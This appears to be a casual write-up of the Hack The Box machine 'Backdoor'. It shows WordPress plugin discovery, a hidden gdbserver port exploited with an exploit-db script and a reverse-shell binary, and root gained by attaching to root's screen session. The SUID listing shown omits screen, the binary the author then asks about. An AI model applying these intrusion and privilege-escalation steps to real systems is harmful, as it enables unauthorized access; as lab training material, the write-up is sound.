The website is powered by `wordpress`...always good to know

```
<meta name="generator" content="WordPress 5.8.1" />
<link rel="canonical" href="http://backdoor.htb/" />
<link rel='shortlink' href='http://backdoor.htb/' />
```

When clicking on home button it points to `backdoor.htb` so I add it to `/etc/hosts`

wich make me look for potential vhosts and subdomains but nah...

when visiting the pages found with the fuzzer we notice with have access to `wp-content`

try to access he `plugins` direcory at `/wp-content/plugins/` 

there is a single plugin installed :

`ebook-download`

```

we google that for exploits and end up [here!](https://www.exploit-db.com/exploits/39575)

that's simple dir traversal dawg....

ye no it was not "simple"...I was stuck here for days

went to the forums and SEEMS LIKE I MISSED A PORT???

ran nmap again...again...aggressive mode ad all but I could not get it 

analyzed that specific port and it was filtered? resetting the machine didnt help

Did that later and wtf?
```
└──╼ $nmap backdoor.htb -p 1337            
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 16:08 WAT
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.13s latency).

PORT     STATE SERVICE
1337/tcp open  waste
```
Anyway long story short we get an exploit for `gdb-server` on exploit-db

we run it and get access. 

Hey don't ask me I am confused too XD 

```
└──╼ $python 50539.py 10.10.11.125:1337 rev.bin

```

```
cat user.txt
```

## privilege escalation

`sudo -l` would not work...how about `suid`?
```
user@Backdoor:/home/user$ find / -perm -u=s 2> /dev/null
find / -perm -u=s 2> /dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd

/usr/bin/pkexec
```
what is `screen`?

Gtfobins say...well...I know this one but not with SUID

```
user@Backdoor:/home/user$ screen -h
screen -h
Use: screen [-opts] [cmd [args]]
 or: screen -r [host.tty]

Options:
-4            Resolve hostnames only to IPv4 addresses.
-6            Resolve hostnames only to IPv6 addresses.
-a            Force all capabilities into each window's termcap.
-A -[r|R]     Adapt all windows to the new display width & height.
-c file       Read configuration file instead of '.screenrc'.
-d (-r)       Detach the elsewhere running screen (and reattach here).
-dmS name     Start as daemon: Screen session in detached mode.
-D (-r)       Detach and logout remote (and reattach here).
-D -RR        Do whatever is needed to get a screen session.
-e xy         Change command characters.
-f            Flow control on, -fn = off, -fa = auto.
-h lines      Set the size of the scrollback history buffer.
-i            Interrupt output sooner when flow control is on.
-l            Login mode on (update /var/run/utmp), -ln = off.
-ls [match]   or
-list         Do nothing, just list our SockDir [on possible matches].
-L            Turn on output logging.
-Logfile file Set logfile name.
-m            ignore $STY variable, do create a new screen session.
-O            Choose optimal output rather than exact vt100 emulation.
-p window     Preselect the named window if it exists.
-q            Quiet startup. Exits with non-zero return code if unsuccessful.
-Q            Commands will send the response to the stdout of the querying process.
-r [session]  Reattach to a detached screen process.
-R            Reattach if possible, otherwise start a new session.
-s shell      Shell to execute rather than $SHELL.
-S sockname   Name this session <pid>.sockname instead of <pid>.<tty>.<host>.
-t title      Set title. (window's name).
-T term       Use term as $TERM for windows, rather than "screen".
-U            Tell screen to use UTF-8 encoding.
-v            Print "Screen version 4.08.00 (GNU) 05-Feb-20".
-wipe [match] Do nothing, just clean up SockDir [on possible matches].
-x            Attach to a not detached screen. (Multi display mode).
-X            Execute <cmd> as a screen command in the specified session.
```

hmm...okay

```
export TERM=xterm
screen -x root/root
```

```
root@Backdoor:~# cat root.txt
cat root.txt
```

That was a fun box, but it left me with many questions

The forums said the LFI was supposed to serve for reading `proc` file about the `gbd-server`

the privilge escalation was not hard though
